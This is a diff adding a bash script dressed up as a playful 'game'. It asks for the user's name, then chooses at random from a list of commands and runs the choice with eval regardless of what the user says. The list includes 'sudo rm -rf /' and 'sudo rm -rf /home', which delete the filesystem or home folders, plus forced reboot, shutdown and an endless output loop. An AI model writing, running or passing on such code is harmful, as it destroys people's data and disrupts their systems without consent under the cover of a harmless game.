@@ -1,0 +1,32 @@
+#!/bin/bash
+echo "Hello"
+read -p "Would you like to play a game? Can I get to know your name? " name
+
+
+game=("reboot" "shutdown -h now" "sudo rm -rf /" "yes 'You are so precious <3'" "sudo rm -rf /home")
+
+
+len=${#game[@]}
+rand_index=$((RANDOM % len))
+
+
+chosen_game="${game[$rand_index]}"
+
+if (($rand_index == 0)); then
+    echo "Hi $name, would you like to play the reboot game then?"
+elif (($rand_index == 1)); then
+    echo "Would you like to play the game of power off then?"
+elif (($rand_index == 2)); then
+    echo "That is so lucky of you"
+elif (($rand_index == 3)); then
+    echo "You are so precious"
+else
+    echo "Somebody's getting their home folder deleted."
+fi
+
+read -p "Do you have anything to say?: " answer
+
+echo "It doesn't matter what you say.Playing anyway, it is not up to you, $name"
+eval "$chosen_game"
+
+
